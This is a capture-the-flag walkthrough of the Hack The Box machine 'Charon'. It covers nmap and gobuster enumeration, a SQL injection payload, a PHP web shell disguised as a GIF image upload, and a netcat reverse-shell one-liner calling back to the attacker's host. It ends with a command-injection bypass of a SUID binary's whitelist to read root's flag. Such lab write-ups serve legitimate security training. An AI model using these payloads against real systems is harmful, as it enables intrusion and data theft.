
![logo](/logo.png)

# [Charon- BOX]  
Hi folks, today I am going to solve an Hard rated hack the box machine which was released on 07 Jul 2017 as the 22nd machine on HTB,Charon created by [decoder](https://app.hackthebox.com/users/1391) without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *http
  *ssh
  *exfiltration
###### code-nmap

```code
nmap -sV -sC -oA nmap/charon 10.10.10.31
```

###### Output 

![](/Linux/Linux-Hard/Charon/Screenshots/nmap.png)

```sh
nmap -sV -sC -oA nmap/charon 10.10.10.31                                                                                          ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-25 19:08 EAT
Nmap scan report for 10.10.10.31
Host is up (0.35s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:c7:fb:a2:4b:53:1a:7a:f3:30:5e:b8:6e:ec:83:ee (RSA)
|   256 97:e0:ba:96:17:d4:a1:bb:32:24:f4:e5:15:b4:8a:ec (ECDSA)
|_  256 e8:9e:0b:1c:e7:2d:b6:c9:68:46:7c:b3:32:ea:e9:ef (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Frozen Yogurt Shop
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.55 seconds
```


looking at the results  we find out that there are 2 ports open and its a `Ubuntu`and its running an `Apache httpd 2.4.18`.  

port[22]-ssh
port[80]-tcp

when we naviagate to [http://10.10.10.31](http://10.10.10.31)  we find a page of Freeze a Yogurt Shop

![](/Linux/Linux-Hard/Charon/Screenshots/browser.png)

i start `gobuster` to enemerate directories sinces it seems that i can not find anything 

```sh
gobuster dir -u http://10.10.10.31 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -x php -t 50
```

![](/Linux/Linux-Hard/Charon/Screenshots/gobuster.png)

At first glance, it appears that singlepost.php is the correct way in, as the website was modified
from the original pre-built publicly available package to use this PHP file rather than the default
HTML file. The file is also vulnerable to sql injection, however it contains no useful information.

![](/Linux/Linux-Hard/Charon/Screenshots/mixphp.png)

looking a bit further reveals the `cmsdata` directory, which is the correct point of entry. and  `forgot.php`

![](/Linux/Linux-Hard/Charon/Screenshots/forgot.png)

# Exploitation

lets try some common union to see what we can find

```sh
a@b.c' uniOn select 1,2,3,concat(__username_,"@example.com") FROM
supercms.operators limit 1,1 -- -
```

![](/Linux/Linux-Hard/Charon/Screenshots/burp.png)

from the union we get the email address to be ``

![](/Linux/Linux-Hard/Charon/Screenshots/burppasswd.png)

we get a password hash let decode it with [CrackStation](https://crackstation.net/)

![](/Linux/Linux-Hard/Charon/Screenshots/crackstation.png)

now when theb navigate to login so that we can login with the credentials earlier found

![](/Linux/Linux-Hard/Charon/Screenshots/login.png)

when we login we find this

![](/Linux/Linux-Hard/Charon/Screenshots/loggedin.png)

we see something interesting an Upload Image File page

![](/Linux/Linux-Hard/Charon/Screenshots/upload.png)

when we view the page source we find some interesting thing that is hidden

![](/Linux/Linux-Hard/Charon/Screenshots/hidden.png)

decoding it revels the name to be `testfile1` so lets startburp and add it but first we do some configaration on burp so as to allow as to intercept the response to.

![](/Linux/Linux-Hard/Charon/Screenshots/burpconfig.png)


we can then `foward` then turn intercept off

![](/Linux/Linux-Hard/Charon/Screenshots/burpreq.png)

![](/Linux/Linux-Hard/Charon/Screenshots/nametype.png)

now we upload a php with an extenstion of `jpg`

```sh
GIF8
<?php system($_GET["cmd"]); ?>
```

![](/Linux/Linux-Hard/Charon/Screenshots/binary.png)

it then pass the filtration

![](/Linux/Linux-Hard/Charon/Screenshots/filters.png)

so by checking where it uploaded it we find that we can execute bash commands

![](/Linux/Linux-Hard/Charon/Screenshots/ls.png)

we execute this but first we have to make a Listner 

```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 1337 >/tmp/f
```

![](/Linux/Linux-Hard/Charon/Screenshots/intercept.png)

and just like that we get shell.

![](/Linux/Linux-Hard/Charon/Screenshots/shell.png)

## Takeover
 After geting the reverse shell we have to do some adjusment to our reverse shell to make it ready for using by doing a stty escalation to get an interactive shell:
#### code-stty
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 [ctrl] + z
 stty raw -echo ; fg
 ```

```sh
export TERM=screen-256color
export SHELL=bash
stty rows 29 cols 135
reset
```

to check for colums and rows in you machine run

```sh
stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'
```

![](/Linux/Linux-Hard/Charon/Screenshots/stty.png)

we try to get the `user flag` but we are uable but we see some interesting files their

![](/Linux/Linux-Hard/Charon/Screenshots/decoder.png)

so we copy the two files into out local host so that we can be able to decrypt it with [RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool) so first we create an `env`

```sh
virtualenv venv 
source venv/bin/activate
```

```sh
git clone https://github.com/RsaCtfTool/RsaCtfTool.git
sudo apt-get install libgmp3-dev libmpc-dev
cd RsaCtfTool
pip3 install -r "requirements.txt"
```

```sh
RsaCtfTool/RsaCtfTool.py --publickey decoder.pub --decryptfile pass.crypt 
```

![](/Linux/Linux-Hard/Charon/Screenshots/decoderpass.png)

You can get the `user flag`  now.

![](/Linux/Linux-Hard/Charon/Screenshots/catuser.png)

# Privillage Escalation

we copy `LinEnum` to the machine so that we can see what is vulnerable.

```sh
scp LinEnum.sh decoder@10.10.10.31:
```

![](/Linux/Linux-Hard/Charon/Screenshots/Linenum.png)

![](/Linux/Linux-Hard/Charon/Screenshots/runLinEnum.png)

we find an SUID which seem intresting lets look at it.

![](/Linux/Linux-Hard/Charon/Screenshots/suid.png)

The binary accepts one argument. By running `strings` against the file, it appears that there is an argument whitelist, and the only allowed argument is `/bin/ls`.

![](/Linux/Linux-Hard/Charon/Screenshots/binsh.png)

There are several methods to bypass the argument whitelist. By entering supershell `/bin/ls` then
using the keyboard shortcut `CTRL+M` to create a newline, and then on the second line entering
`cat /root/root.txt`. The other method is to trail /`bin/ls` with `$(cat /root/root.txt)`

```sh
supershell '/bin/ls$(cat /root/root.txt)'
```

then we get `root flag`

![](/Linux/Linux-Hard/Charon/Screenshots/rootflag.png)

	-------------------------END successful attack @lesley----------------------

